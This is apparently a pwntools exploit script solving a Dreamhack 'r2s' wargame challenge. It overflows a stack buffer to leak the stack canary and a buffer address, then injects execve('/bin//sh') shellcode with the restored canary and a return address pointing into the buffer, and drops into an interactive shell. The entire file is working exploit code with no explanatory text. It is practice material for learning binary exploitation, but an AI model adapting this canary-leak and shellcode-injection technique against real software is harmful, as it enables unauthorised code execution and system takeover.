from pwn import *

#p = remote("host3.dreamhack.games",10109)
p = process("./r2s")
e = ELF('./r2s')

# raw_input("DEBUG")
payload = b''
payload += b'a' * (0x58 + 0x1)

p.recvuntil(": ")
buf = p.recv(14)
print(buf)
buf = int(buf,16)
p.recvuntil(": ")
dist = p.recv(2)
print(dist)

p.sendafter(":",payload)
p.recvuntil("'")
p.recvuntil(payload)
canary = b'\x00' + p.recv(7)
print(canary)

ret = 0x00000000000009db

payload = b''
payload += b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
payload += b'a'*(0x58-23)
payload += canary
payload += b'b'*0x8
# payload += p64(ret)
payload += p64(buf)


p.sendlineafter(":",payload)

p.interactive()
